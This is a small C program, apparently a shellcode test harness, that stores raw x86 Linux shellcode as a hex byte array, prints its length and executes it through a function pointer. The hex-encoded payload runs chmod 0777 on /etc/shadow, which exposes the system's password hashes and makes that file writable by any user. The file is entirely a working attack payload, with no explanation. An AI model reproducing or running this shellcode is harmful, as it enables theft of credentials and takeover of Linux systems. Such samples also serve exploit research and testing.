#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe6\x50\x68\x30\x37\x37\x37\x89\xe5\x50\x68\x68\x6d\x6f\x64\x68\x69\x6e\x2f\x63\x68\x2f\x2f\x2f\x62\x89\xe3\x50\x56\x55\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}	
